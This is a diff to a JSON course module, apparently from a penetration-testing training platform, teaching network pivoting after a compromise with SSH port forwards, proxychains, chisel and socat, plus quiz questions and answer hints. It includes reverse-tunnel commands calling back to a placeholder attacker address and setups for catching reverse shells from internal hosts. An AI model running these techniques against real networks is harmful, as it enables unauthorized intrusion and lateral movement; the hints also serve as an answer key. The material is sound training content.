@@ -4,29 +4,79 @@
   "tasks": {
     "1": {
       "title": "SSH port forwarding: -L, -R and -D",
+      "body": "## The foothold\n\nTypical scenario: you scan the DMZ, compromise `10.10.10.5`, and from that\nmachine you discover `192.168.1.0/24` — an internal network your Kali cannot\nreach directly. Everything that follows assumes valid SSH credentials\non the pivot (by password, stolen key, or your own shell upgraded to\nSSH).\n\n## Local forward (-L): an internal service on your localhost\n\n```bash\n# Opens http://localhost:8080 on your Kali = 192.168.1.20:8080 as seen from the pivot:\nssh -N -L 8080:192.168.1.20:8080 usuario@10.10.10.5\n\n# -N: do not run a shell, just the tunnel\n# Now from YOUR machine:\ncurl http://localhost:8080\nnmap -sV -p 8080 localhost        # fingerprinting the internal service\n```\n\nThe destination (`192.168.1.20`) does NOT have to be the SSH server itself: SSH\nconnects from the pivot to wherever you tell it. That detail is what\nturns -L into an internal network scanner.\n\n## Remote forward (-R): your machine visible from inside\n\n```bash\n# The reverse: port 9001 on the PIVOT forwards to your 9001\nssh -N -R 9001:127.0.0.1:9001 usuario@10.10.10.5\n```\n\nThe star use case: an internal victim runs your reverse shell\npointing at `10.10.10.5:9001` (its own network) and that connection lands on\nyour Kali listener. No new firewall rules, no internet\negress from the internal segment.\n\n## Dynamic SOCKS (-D): the tunnel that works for everything\n\n```bash\n# A single tunnel, any destination:\nssh -N -D 1080 usuario@10.10.10.5\n```\n\n`localhost:1080` is now a **SOCKS5** proxy that routes any\nconnection through the pivot. Unlike -L (one fixed destination per\ntunnel), SOCKS decides the destination on every connection — perfect for\nscanning entire ranges. How to use it: the next task.\n\n## Cheat sheet for the three\n\n| Flag | Direction | Typical use |\n|---|---|---|\n| `-L` | YOUR machine → via pivot → destination | Reach one specific internal service |\n| `-R` | Pivot's network → YOUR machine | Receive shells/callbacks from inside |\n| `-D` | YOUR machine: universal SOCKS proxy | Scan/browse the whole internal network |\n",
       "questions": {
-        "pivoting-y-tunneling-t01-q01": { "prompt": "Which SSH flag creates a LOCAL tunnel: a port on YOUR machine listening and forwarding to a destination only visible from the SSH server?" },
-        "pivoting-y-tunneling-t01-q02": { "prompt": "You have SSH credentials on 10.10.10.5 (DMZ) and from there an internal web service runs on 192.168.1.20:8080 you cannot see from outside. Write the full command to open it on your localhost:8080." },
-        "pivoting-y-tunneling-t01-q03": { "prompt": "Which SSH flag does the INVERSE: exposes a service on YOUR machine to the SSH server's network?" },
-        "pivoting-y-tunneling-t01-q04": { "prompt": "Which SSH flag raises a dynamic SOCKS4/5 proxy (one port routing to ANY destination reachable by the server)?" }
+        "pivoting-y-tunneling-t01-q01": {
+          "prompt": "Which SSH flag creates a LOCAL tunnel: a port on YOUR machine listening and forwarding to a destination only visible from the SSH server?",
+          "hint": "-L (local). The order: -L [bind:]localPort:destHost:destPort"
+        },
+        "pivoting-y-tunneling-t01-q02": {
+          "prompt": "You have SSH credentials on 10.10.10.5 (DMZ) and from there an internal web service runs on 192.168.1.20:8080 you cannot see from outside. Write the full command to open it on your localhost:8080.",
+          "hint": "ssh -L 8080:192.168.1.20:8080 usuario@10.10.10.5 — then curl http://localhost:8080"
+        },
+        "pivoting-y-tunneling-t01-q03": {
+          "prompt": "Which SSH flag does the INVERSE: exposes a service on YOUR machine to the SSH server's network?",
+          "hint": "-R (remote): -R remotePort:localHost:localPort — the classic for catching a reverse shell in a segment with no egress"
+        },
+        "pivoting-y-tunneling-t01-q04": {
+          "prompt": "Which SSH flag raises a dynamic SOCKS4/5 proxy (one port routing to ANY destination reachable by the server)?",
+          "hint": "-D 1080 creates the SOCKS on localhost:1080"
+        }
       }
     },
     "2": {
       "title": "proxychains: any tool through the tunnel",
+      "body": "## Configuring proxychains\n\n```bash\nsudo nano /etc/proxychains4.conf\n\n# At the end of the file, in [ProxyList], comment out whatever is there and add:\nsocks5 127.0.0.1 1080\n```\n\nWith the SOCKS from the previous task's `ssh -D 1080` alive, any\ntool that respects proxies starts to \"live\" inside the internal network:\n\n```bash\nproxychains nmap -sT -Pn -n --top-ports 100 192.168.1.0/24\nproxychains curl http://192.168.1.20:8080\nproxychains python3 -m http.server  # no — this is a server; proxychains proxies CLIENTS\n```\n\nWatch out for that last one: proxychains intercepts OUTGOING connections. An\n`http.server` set up this way gains nothing — servers are exposed with\nSSH's -R/-L forwards.\n\n## Scanning the internal network without burning the tunnel\n\nICMP does not travel through SOCKS (it is TCP-only): `proxychains ping` ALWAYS fails.\nThe correct internal scan:\n\n```bash\n# Host discovery without ping, full TCP connection (-sT, half-open SYN does not work over SOCKS):\nproxychains nmap -sT -Pn -n --min-rate 50 --top-ports 100 192.168.1.0/24\n\n# Against a specific host you already found:\nproxychains nmap -sT -Pn -n -sV -p 21,22,80,443,3389,8080 192.168.1.20\n```\n\n`-Pn` (treat as up) and `-n` (do not resolve DNS — resolution through the\ntunnel would use the internal resolver, better kept under control) are\nde facto mandatory in scans through a proxy.\n\n## The limits of proxychains\n\n- TCP only (no ICMP/UDP).\n- Applications that ignore proxies (static binaries, some\n  exploits using raw sockets) do not go through the tunnel.\n- Modern alternative when you need UDP/DNS: `sshuttle` (transparent\n  via iptables) — think of it as a \"poor man's VPN\": `sshuttle -r\n  usuario@10.10.10.5 192.168.1.0/24` and ALL your traffic to that network\n  travels over SSH with no further configuration.\n\n## Chain modes\n\n`proxychains.conf` opens with the mode: `strict` walks the ProxyList\nin a fixed order; `dynamic` skips dead proxies; `random` randomizes (with\n`chain_len`). For single-hop pivoting any of them works — the detail\nmatters when chaining 2+ hops.\n",
       "questions": {
-        "pivoting-y-tunneling-t02-q01": { "prompt": "In which file does proxychains configure its default SOCKS proxy (full Linux path)?" },
-        "pivoting-y-tunneling-t02-q02": { "prompt": "Write the line you would add to the ProxyList to use the SOCKS5 from the previous task's SSH." },
-        "pivoting-y-tunneling-t02-q03": { "prompt": "Why does proxychains NEVER route ICMP (ping), and which nmap option replaces ping for host discovery through the SOCKS?" },
-        "pivoting-y-tunneling-t02-q04": { "prompt": "Which proxychains mode switches to the next proxy in the list when one fails (ideal when chaining several pivots)?" }
+        "pivoting-y-tunneling-t02-q01": {
+          "prompt": "In which file does proxychains configure its default SOCKS proxy (full Linux path)?",
+          "hint": "/etc/proxychains.conf (or proxychains4.conf) — [ProxyList] section at the end"
+        },
+        "pivoting-y-tunneling-t02-q02": {
+          "prompt": "Write the line you would add to the ProxyList to use the SOCKS5 from the previous task's SSH.",
+          "hint": "socks5 127.0.0.1 1080"
+        },
+        "pivoting-y-tunneling-t02-q03": {
+          "prompt": "Why does proxychains NEVER route ICMP (ping), and which nmap option replaces ping for host discovery through the SOCKS?",
+          "hint": "SOCKS only encapsulates TCP; ping is ICMP — use nmap -Pn (or -sn with TCP) and treat hosts as up"
+        },
+        "pivoting-y-tunneling-t02-q04": {
+          "prompt": "Which proxychains mode switches to the next proxy in the list when one fails (ideal when chaining several pivots)?",
+          "hint": "Three modes: dynamic, strict (fixed order) and random — the one that skips dead proxies is dynamic",
+          "options": {
+            "a": "dynamic",
+            "b": "strict",
+            "c": "random"
+          }
+        }
       }
     },
     "3": {
       "title": "No SSH: chisel and socat",
+      "body": "## When there is no SSH\n\nMany pivots (a web shell, a Windows box without OpenSSH, an IoT device) do not\ngive you SSH. The two tools that fill that gap:\n\n## chisel: the HTTP/WebSocket tunnel\n\nA single binary (Go) that runs the same on your Kali, on the pivot's\nWindows or on the ARM chip of an IP camera. You upload the binary, run it, and\nyou get SOCKS or port forwards over a channel that crosses HTTP proxies\n(WebSockets disguised as web traffic).\n\n**Reverse tunnel (the most common case — internal network with no inbound):**\n\n```bash\n# 1. On YOUR Kali (the chisel server, listening on 443, which is usually allowed):\n./chisel server -p 443 --reverse\n\n# 2. On the PIVOT (upload the chisel binary for its architecture):\n./chisel client https://TU_IP:443 R:socks\n\n# 3. Result: SOCKS5 on YOUR localhost:1080 exiting through the pivot\nproxychains nmap -sT -Pn -n 192.168.1.0/24 --top-ports 100\n```\n\nNotice the direction: the pivot CONNECTS TO you. No new inbound\nports in the internal segment; the firewall sees a normal outbound\nHTTPS connection. `--reverse` authorizes the client to register\nlisteners on your server.\n\n**One-off port forward** (the equivalent of `ssh -L`):\n\n```bash\n# Kali: ./chisel server -p 443 --reverse\n# Pivot: ./chisel client https://TU_IP:443 R:8080:192.168.1.20:8080\n# → YOUR localhost:8080 = 192.168.1.20:8080 via pivot\n```\n\n## socat: the universal TCP cable\n\nWhen you only need a direct relay and the binary is already on the\ntarget (socat is common on Linux):\n\n```bash\n# On the pivot: pivot's 8080 → internal service\nsocat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.20:8080 &\n\n# Now from outside you point at pivot:8080 (if the DMZ allows it)\ncurl http://10.10.10.5:8080\n```\n\nUnencrypted and unauthenticated — perfect inside a segment that you\ncontrol temporarily, unforgivable on the first hop. socat is also\nuseful for file transfer (`socat TCP-LISTEN:9001 FILE:chisel_bin`),\ninteractive shells and dozens of other relays: it is the wildcard.\n\n## Quick choice\n\n| Situation | Tool |\n|---|---|\n| SSH credentials on the pivot | `ssh -D` + proxychains |\n| No SSH, HTTPS egress from the pivot | chisel reverse SOCKS |\n| Simple one-port relay, socat already present | socat |\n| You need UDP/DNS through the tunnel | sshuttle or VPN (WireGuard) |\n",
       "questions": {
-        "pivoting-y-tunneling-t03-q01": { "prompt": "What language is chisel written in (giving it the single multi-platform binary you upload to the pivot)?" },
-        "pivoting-y-tunneling-t03-q02": { "prompt": "Write the chisel CLIENT command on pivot 10.10.10.5 to open a SOCKS5 on your Kali (the pivot connects out to your 443)." },
-        "pivoting-y-tunneling-t03-q03": { "prompt": "With socat: which option on the pivot forwards a local port to another host (a minimal 'port forward' relay)?" },
-        "pivoting-y-tunneling-t03-q04": { "prompt": "What KEY advantage does chisel's reverse mode (--reverse) have in networks with strict egress firewalls?" }
+        "pivoting-y-tunneling-t03-q01": {
+          "prompt": "What language is chisel written in (giving it the single multi-platform binary you upload to the pivot)?",
+          "hint": "Go — the same reason modern C2s use it too"
+        },
+        "pivoting-y-tunneling-t03-q02": {
+          "prompt": "Write the chisel CLIENT command to run on pivot 10.10.10.5 to open a reverse SOCKS5 to your Kali (which listens on port 443; use TU_IP as your address).",
+          "hint": "On YOUR Kali: chisel server -p 443 --reverse; on the pivot: chisel client https://TU_IP:443 R:socks"
+        },
+        "pivoting-y-tunneling-t03-q03": {
+          "prompt": "With socat: which option on the pivot forwards a local port to another host (a minimal 'port forward' relay)?",
+          "hint": "socat TCP-LISTEN:8080,fork TCP:192.168.1.20:80 — listens on 8080 and relays to the internal host"
+        },
+        "pivoting-y-tunneling-t03-q04": {
+          "prompt": "What KEY advantage does chisel's reverse mode (--reverse) have on networks with a strict egress firewall?",
+          "hint": "Think about who initiates the connection and which firewall rules that requires in the internal segment.",
+          "options": {
+            "a": "It encrypts traffic with a stronger key than SSH",
+            "b": "It lets you scan UDP through the tunnel",
+            "c": "The connection is initiated by the pivot outward (outbound), with no inbound ports",
+            "d": "It avoids having to run any binary on the pivot"
+          }
+        }
       }
     }
   }
